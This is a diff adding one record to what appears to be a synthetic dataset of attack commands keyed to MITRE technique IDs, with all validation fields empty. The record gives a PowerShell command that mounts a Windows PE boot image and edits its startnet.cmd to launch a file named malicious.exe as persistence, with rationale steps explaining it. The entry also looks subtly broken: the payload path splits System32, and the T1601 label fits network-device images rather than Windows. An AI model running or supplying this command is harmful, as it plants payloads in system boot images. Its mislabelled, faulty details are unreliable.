@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Wim /WimFile:C:\\Images\\boot.wim /Index:2 /MountDir:C:\\Mount\\Boot; Add-Content -Path C:\\Mount\\Boot\\Windows\\System32\\startnet.cmd -Value 'start \"\" X:\\Windows\\System\\32\\malicious.exe'; dism /Unmount-Wim /MountDir:C:\\Mount\\Boot /Commit; Get-FileHash C:\\Images\\boot.wim -Algorithm SHA256; fc /b C:\\Images\\boot_clean.wim C:\\Images\\boot.wim",
+  "explanation": "Patches the Windows PE boot image by altering startnet.cmd to launch a payload, then verifies the integrity shift through hashing and binary diff.",
+  "rationale_steps": [
+    "Mount boot.wim index 2 (WinPE) with DISM.",
+    "Modify startup script to persist a payload within the system image.",
+    "Commit changes and unmount to save the patched boot image.",
+    "Verify modifications via checksum and fc binary comparison."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-7053c5d6-596528e3",
+  "source_prompt_hash": "7053c5d6",
+  "timestamp_utc": "2025-09-30T04:53:44.701470Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
